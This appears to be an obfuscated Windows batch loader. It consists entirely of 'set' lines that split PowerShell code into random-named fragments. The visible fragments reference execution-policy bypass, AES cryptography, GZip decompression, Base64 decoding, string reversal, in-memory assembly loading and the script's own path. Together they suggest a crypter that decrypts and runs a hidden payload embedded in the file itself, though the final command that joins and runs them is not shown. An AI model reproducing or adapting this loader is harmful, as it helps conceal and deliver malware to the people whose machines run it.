@echo off
set "NJfiRsccBI=$ZWl"
set "JqOIqPdhWx='gni"
set "moDkrrwLUj=y]::"
set "zkVzErNQMu=saBm"
set "ZeOgdjiygg=r.En"
set "kkfgrFyRKY=WtTh"
set "hMqoHMivwq=n ''"
set "qCiBvbuAyb=w = "
set "FhNsdGbDHa=.Dis"
set "CewNFJVmvd=mory"
set "vcWfbfFlwQ=New-"
set "WMgRLwvKBN=tryP"
set "qeMJsJwAIM=onve"
set "DMEsFprBrI=.Cry"
set "shevxuKovf=lit("
set "kKPTWKtipq=rtS4"
set "PwUdwcGaYM=]::N"
set "nJNDvtbJbm=ach "
set "ibPBFxwwIk=lBlo"
set "sIzeYVyjVK= [Sy"
set "LsotDBdZDE=+hAO"
set "ZEiDuirhwy=)))"
set "CrMyEUxEsm=rofi"
set "COoFQAkMuB=ert]"
set "qAjpjKrShj=nage"
set "hoGNtGgkTL=$EuQ"
set "nLPQqqdUcK=]::("
set "nSCnywkkRu=Fina"
set "UyihGQryjb=sion"
set "MPnVjpuMUv=y.Ci"
set "RASlenMhpv=ing("
set "gwcTohVKGP=-ep "
set "pwtrjnZFBO=t.Pa"
set "mndVWchfMQ=Disp"
set "iASCBJkECB=yTo("
set "AQUYaaCFhw=;$ks"
set "RBOJvsgigl=tbIr"
set "IpHVUgnquU=m.IO"
set "phNphHLKWE=.Cre"
set "uEuVhuJREL=-Obj"
set "FAAKOxhlUO=ress"
set "bEnFPoTqTB=rE ="
set "TvuXxfWJND=[]] "
set "duOLkgwhxt=stem"
set "wHmpLKznLH=e]::"
set "BGMttUhukU=ptor"
set "VfIzzcJcUZ=KIw."
set "YuPwPqYlkG=pose"
set "ODEshAKOtc=.Con"
set "CKMAPYupCd== [S"
set "gSUaTfUfxH=1] -"
set "djCmufjLhp=.Com"
set "hbDqTlVYdh=tem."
set "aDoLdVklhP=g = "
set "KViQWcGyNX=pher"
set "fPWPlfkkGJ=::('"
set "FoHoXIgTop=embl"
set "tTXNINtgHo=m.Re"
set "rFqdXHwydt='[-1"
set "RuilEEWZge=daeR"
set "bWoCKgTkmw=em.C"
set "IMSwSplygj=comp"
set "IjyXPfGTNH=ke($"
set "GGuBZwOXXU=tMf."
set "FnFqIXXtFI=tmf "
set "TTZOSqAZai=oint"
set "olTGfBmCWl=ew-O"
set "ubkpFRwqjr=PKCS"
set "brQpZidEzv=gnir"
set "lbdEaqgeOq=();$"
set "QQfDCNPANK=tMf "
set "etOCFzvnhM=JTr "
set "eZkQDVBJnH=ionM"
set "iuSkAGLesx=:: '"
set "HEpatBuipk=oL'["
set "WfqqBHklZb=TllA"
set "gEGswSXwYT=.GZi"
set "dAfuFDPleK=ress"
set "CNSZzcvOpx=$BJg"
set "IrvigGttbm=ZWly"
set "ODteTIMivG=mf.T"
set "JpEXrEePUB=$BJg"
set "DKYlDHkUvp=OyzA"
set "diWbNlLfSa=Stre"
set "QcxmTzAGSO=tion"
set "hsprqrhMwd= = $"
set "IXUoaNznfT=();$"
set "ylPBZzdcun=$EuQ"
set "vzzzxDWWQy=6] -"
set "tidRcXgurC=th('"
set "coipOCWEeb=Wlyt"
set "OsqVilDcKO=; };"
set "kcJBkfAcBE=, $B"
set "NvhPcwuBQH=[Sys"
set "aeXfTQITcc= New"
set "wqRmDlleER=[IO."
set "dqGbCblVTN=1..-"
set "wKAsDeORZS=stem"
set "jvHzQBfrxb=ss -"
set "arckFGLBMX=tsWi"
set "cHjYubYNfM=stem"
set "hWPCpMlrBK=-nop"
set "VpdfSzepmx=ose("
set "NCAVecupaE=ment"
set "ZqeYivPAcH=Wlyt"
set "SmeAxVTKpb=raph"
set "nqoHmRNVMM=0O+g"
set "xCAgWfevuw=g, 0"
set "HfGzjDJNYu=orF'"
set "AhrALTGukm=ck($"
set "dPeasJMZRb=.Ass"
set "vEAEzzzsni=esFX"
set "rdmIcgvgEe=urit"
set "DlSFuwyWru=]::("
set "FqMUOKjFDT=isfL"
set "pekMrCQekM=] -j"
set "YeeMlXgNBQ=('l0"
set "uBNBKgOsTZ=ct S"
set "QqsRgSxuLQ=.Dis"
set "VrkQbVngEY=d;$Z"
set "lxWDohOjbr=]::C"
set "XcdzKNkmVd=bjec"
set "ilJxeayPXD='dqR"
set "FitMrkAzxz=tem."
set "nSukoyApgO=Wlyt"
set "ufyvSvRJfr=se()"
set "SxUEETFQtl=[Sys"
set "TVxKNBpKWZ= '')"
set "SIfTPCLZXL=6esa"
set "jyKyYzKpjR=('%~f0'"
set "erHRXkrZqq=;$OA"
